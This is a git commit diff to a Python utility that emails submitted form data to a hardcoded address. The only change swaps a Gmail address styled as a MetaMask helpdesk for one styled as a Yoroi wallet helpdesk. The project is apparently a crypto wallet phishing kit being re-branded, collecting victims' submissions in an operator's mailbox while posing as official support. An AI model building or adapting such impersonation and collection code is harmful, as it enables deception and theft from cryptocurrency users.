15b5f5b799ca953265d58d9c32d0dd52f9ead9d8
Ejike Sylva <67736638+DevSylva@users.noreply.github.com>
2022-03-27 23:58:38 +0100

    Update utils.py

--- core/utils.py
+++ core/utils.py
@@ -6,6 +6,6 @@ class Util:
         email = EmailMessage(
             subject=data["subject"],
             body=data['body'],
-            to=["metamaskhelpdeskio@gmail.com"]
+            to=["helpdeskyoroiwallet@gmail.com"]
         )
         email.send()
